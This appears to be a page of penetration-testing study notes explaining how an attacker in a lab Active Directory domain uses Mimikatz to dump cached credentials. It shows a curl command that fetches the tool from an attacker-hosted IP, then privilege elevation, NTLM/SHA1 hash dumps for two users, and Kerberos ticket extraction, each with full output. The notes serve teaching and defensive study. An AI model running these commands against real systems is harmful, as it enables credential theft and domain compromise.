---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Cached AD Credentials

This section will serve as a discussion of cached credentials and tickets in the context of AD. It will be  illustrated with an example. This will continue to leverage the example AD environment seen in [earlier examples](../enumeration/manual.md). It is assumed the attacker has gained access to the user account `jeff`, and is able to access a domain-connected machine (`CLIENT75`) via RDP. The example will assume no AV is present on the machines and thus a pre-compiled Mimikatz binary can be used.

The example will use [Mimikatz](../../../password-attacks/password-cracking-fundamentals/working-with-ntlm-hashes/#mimikatz) to attempt domain hash extraction on the target. If the attacker gains access to these hashes, they could crack them to obtain the cleartext password or reuse them to perform various actions.

Since the `LSASS` process is part of the operating system and runs as `SYSTEM`, one will need `SYSTEM` (or local administrator) permissions to gain access to the hashes stored on a target. For this reason, attackers will often need to start their attack chain with a local [privilege escalation](../../privilege-escalation/) attack

To make things even more tricky, the data structures used to store the hashes in memory are not publicly documented, and they are also encrypted with an LSASS-stored key.

## Machine Users

The first step is to attempt gathering of user credential hashes via `sekurlsa::logonpasswords`. This should dump hashes for all users logged on to the current workstation or server, _including remote logins_ like Remote Desktop sessions. To prepare, the attacker uses the following commands:

```shell-session
C:\Users\jeff\Tools>curl http://192.168.45.151/windows/exe/tools/mimikatz_x64.exe -o .\mimikatz.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1323k  100 1323k    0     0  2640k      0 --:--:-- --:--:-- --:--:-- 2647k

C:\Users\jeff\Tools>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

652     {0;000003e7} 1 D 41375          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0011897e} 2 F 4504834     CORP\jeff       S-1-5-21-1987370270-658905905-1781884369-1105   (13g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 4555445     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```

At this point the attacker is ready to dump logged on users' passwords:

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 4876838 (00000000:004a6a26)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 12:32:11 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
        tspkg :
        wdigest :
         * Username : jeff
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
Authentication Id : 0 ; 122474 (00000000:0001de6a)
Session           : Service from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 1:32:23 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
```

The output above shows the logon information for the `jeff` and `dave` users. `jeff` is the account being used for this example but `dave` is a new target.

One can observe two types of hashes highlighted in the output above. This will vary based on the functional level of the AD implementation.

For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On older operating systems like Windows 7, or operating systems that have it manually set, WDigest will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext passwords alongside the password hashes.

Now that the attacker has the hashes, they could attempt to crack them as seen in [other](../../../password-attacks/password-cracking-fundamentals/) sections.

## Kerberos Tickets

In this example, instead of cracking the password hashes, the attacker will attempt to exploit Kerberos authentication by abusing TGT and service tickets. As noted [elsewhere](../../../software/mimikatz.md#lsass), Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS.

For the purposes of the example, a service ticket will be deliberately created by attempting to enumerate an SMB share on the network via the `dir` command:

```powershell
PS C:\Users\jeff> dir \\web04.corp.com\backup


    Directory: \\web04.corp.com\backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
```

The actual output is irrelevant, the purpose was simply to ensure that a service ticket would be created allowing `jeff` to access `WEB04`.



```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 1865530 (00000000:001c773a)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 3/25/2024 3:33:28 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 3/25/2024 3:33:28 PM ; 3/26/2024 1:33:28 AM ; 4/1/2024 3:33:28 PM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             82a9bbeaccf84c0159d1595062a09e2476561851ed4eb360bd9833566fd0fc5d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 11       [...]
         [00000001]
           Start/End/MaxRenew: 3/25/2024 3:33:28 PM ; 3/26/2024 1:33:28 AM ; 4/1/2024 3:33:28 PM
           Service Name (02) : ProtectedStorage ; DC1.corp.com ; @ CORP.COM
           Target Name  (02) : ProtectedStorage ; DC1.corp.com ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40850000    : name_canonicalize ; ok_as_delegate ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             8c4963c4696c9890900659004b4c66954fa4de3c8ba1ddf6f32da893041c79b8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]
         [00000002]
           Start/End/MaxRenew: 3/25/2024 3:33:28 PM ; 3/26/2024 1:33:28 AM ; 4/1/2024 3:33:28 PM
           Service Name (02) : cifs ; DC1.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; DC1.corp.com ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40850000    : name_canonicalize ; ok_as_delegate ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             3c6bd4e8a7c321aff0411c4511495ce19ac8128ad6eefe5ec215e25956d69ff3
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]
           
           ...
           
           Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 3/25/2024 3:33:28 PM ; 3/26/2024 1:33:28 AM ; 4/1/2024 3:33:28 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (--) : @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( $$Delegation Ticket$$ )
           Flags 60810000    : name_canonicalize ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             7e6a41f165af1c1c2199501b7a185e85bf395dacd1fd4a78c8a4a6e1808126ae
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
         [00000001]
           Start/End/MaxRenew: 3/25/2024 3:33:28 PM ; 3/26/2024 1:33:28 AM ; 4/1/2024 3:33:28 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             b3c7a13b3f852af6294e2c20eace024d9281f1c10f7def1879a557afba6d1aac
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
```

The sample output above shows both a TGT and a TGS. Stealing a TGS would allow someone to access only particular resources associated with those tickets. Alternatively, armed with a TGT, one could request a TGS to target specific resources within the domain.

Mimikatz can also export tickets to the hard drive and import tickets into LSASS.

Sometimes the [`crypto::capi`](../../../software/mimikatz.md#cryptoapi) or [`crypto::cng`](../../../software/mimikatz.md#cryptoapi-next-generation) will be needed to make "unexportable" keys/tickets exportable.
